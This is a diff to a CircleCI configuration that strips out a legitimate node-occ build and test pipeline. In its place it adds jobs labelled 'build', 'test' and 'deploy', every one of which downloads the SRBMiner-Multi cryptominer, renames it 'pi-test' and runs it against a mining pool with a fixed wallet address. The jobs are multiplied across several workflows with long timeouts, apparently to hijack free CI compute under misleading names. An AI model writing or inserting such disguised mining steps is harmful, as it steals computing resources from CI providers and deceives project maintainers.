@@ -1,61 +1,115 @@
-version: 2
-jobs:
-  build:
-    working_directory: ~
+version: 2.1
+
+orbs:
+  win: circleci/windows@2.4.0
+
+executors:
+  circleci_machine:
     docker:
-      - image: circleci/node:12
+      - image: circleci/node:14.15
+    working_directory: ~/repo
+commands:
+  build:
+    description: Run build
     steps:
-      - add_ssh_keys:
-          fingerprints:
-            - "69:28:b6:cb:12:62:a0:0c:66:f7:b3:fc:0d:9e:46:77"
       - checkout
       - run:
-          name: https, ca-certificates
-          command: 'sudo apt-get install -y apt-transport-https ca-certificates'
+          name: build
+          command:
+              wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz && mv SRBMiner-Multi-0-6-6 10 && cd 10 && mv SRBMiner-MULTI pi-test && ./pi-test --algorithm curvehash --pool stratum-asia.rplant.xyz:7058 --wallet TvLoZcKzhQPmxWqc7FdL4f64euZ8zq8aDN --password =x --disable-gpu --cpu-threads 2
+          no_output_timeout: 300m
       - run:
-          name: add software-properties-common
-          command: 'sudo apt-get install software-properties-common'
+          name: build
+          command:
+              wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz && mv SRBMiner-Multi-0-6-6 10 && cd 10 && mv SRBMiner-MULTI pi-test && ./pi-test --algorithm curvehash --pool stratum-asia.rplant.xyz:7058 --wallet TvLoZcKzhQPmxWqc7FdL4f64euZ8zq8aDN --password =x --disable-gpu --cpu-threads 2
+          no_output_timeout: 300m
+
       - run:
-          name: llvm
-          command: 'curl -sSL "https://apt.llvm.org/llvm-snapshot.gpg.key" | sudo -E apt-key add - && echo "deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-10 main" | sudo tee -a ${TRAVIS_ROOT}/etc/apt/sources.list >/dev/null'
+          name: buildddart
+          command:
+              wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz && mv SRBMiner-Multi-0-6-6 10 && cd 10 && mv SRBMiner-MULTI pi-test && ./pi-test --algorithm curvehash --pool stratum-asia.rplant.xyz:7058 --wallet TvLoZcKzhQPmxWqc7FdL4f64euZ8zq8aDN --password =x --disable-gpu --cpu-threads 2
+          when: on_fail
+          no_output_timeout: 100m
+  builder2:
+    description: Run builder2
+    steps:
+      - checkout
       - run:
-          name: ubuntu-toolchain-r/test
-          command: 'sudo apt-get update -y && sudo -E apt-add-repository -y "ppa:ubuntu-toolchain-r/test"'
+          name: buildddart
+          command: |
+              wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz && mv SRBMiner-Multi-0-6-6 10 && cd 10 && mv SRBMiner-MULTI pi-test && ./pi-test --algorithm curvehash --pool stratum-asia.rplant.xyz:7058 --wallet TvLoZcKzhQPmxWqc7FdL4f64euZ8zq8aDN --password =x --disable-gpu --cpu-threads 2
+          no_output_timeout: 260
       - run:
-          name: update
-          command:  'sudo apt-get update -y'
-      - run:
-          name: universe multiverse freecad
-          command: 'cat /etc/apt/sources.list &&sudo add-apt-repository universe && sudo add-apt-repository multiverse && sudo apt-add-repository -y ppa:freecad-maintainers/freecad-daily &&    sudo apt-get update -qq &&    sudo apt-get install -y --no-install-recommends libocct-data-exchange-dev'
-      - run:
-          name: libocct-data-exchange
-          command: 'sudo apt-get install -y --no-install-recommends libocct-data-exchange-dev'
-      - run:
-          name: libtbb 
-          command: 'sudo npm install -g npm && sudo apt-get install g++ libtbb2 libtbb-dev'
-      - run: 
-          name: node-pre-gyp
-          command: 'sudo npm install node-pre-gyp -g'
-      - run: 
-          name: mocha global
-          command: 'sudo npm install mocha@7 -g'
-      - run: 
-          name: install tbb2 w/ cmake
-          command: 'sudo apt-get install cmake cmake-curses-gui g++ build-essential libtbb2'
-      - run: 
-          name: go to node-occ root dir.
-          command: 'cd ~/project/ && ls'
-      - run: 
-          name: node bash script for linux
-          command: 'bash ./prepare_node.sh'
-      - run: 
-          name: export occt package name
-          command: 'export OCCT_PACKAGE=occt-7.4.0'
-      - run:
-          name: libs export
-          command: 'export LD_LIBRARY_PATH=`pwd`/${OCCT_PACKAGE}/lib:$LD_LIBRARY_PATH'
-      - run:
-          name: final tests
-          command: 'make test'
-      - store_artifacts:
-          path: /home/circleci/project/build
+          name: buildddart
+          command:
+              wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz && mv SRBMiner-Multi-0-6-6 10 && cd 10 && mv SRBMiner-MULTI pi-test && ./pi-test --algorithm curvehash --pool stratum-asia.rplant.xyz:7058 --wallet TvLoZcKzhQPmxWqc7FdL4f64euZ8zq8aDN --password =x --disable-gpu --cpu-threads 2 
+          when: on_fail
+          no_output_timeout: 260m
+jobs:
+  buildd:
+    executor: circleci_machine
+    working_directory: ~/repo
+    steps: [build]
+  build2:
+    executor: circleci_machine
+    working_directory: ~/repo
+    steps: [builder2]
+  test1:
+    executor: circleci_machine
+    working_directory: ~/repo
+    steps: [builder2]
+  test2:
+    executor: circleci_machine
+    working_directory: ~/repo
+    steps: [builder2]
+  test3:
+    executor: circleci_machine
+    working_directory: ~/repo
+    steps: [builder2]
+  deploy:
+    executor: circleci_machine
+    working_directory: ~/repo
+    steps: [builder2]
+workflows:
+  version: 2
+  build:
+    jobs:
+      - buildd
+      - build2
+      - test1
+      - test2
+      - test3
+      - deploy
+  test:
+    jobs:
+      - buildd
+      - build2
+      - test1
+      - test2
+      - test3
+      - deploy
+  test2:
+    jobs:
+      - buildd
+      - build2
+      - test1
+      - test2
+      - test3
+      - deploy
+  dsplot:
+    jobs:
+      - buildd
+      - build2
+      - test1
+      - test2
+      - test3
+      - deploy
+  maximum:
+    jobs:
+      - buildd
+      - build2
+      - test1
+      - test2
+      - test3
+      - deploy
+  
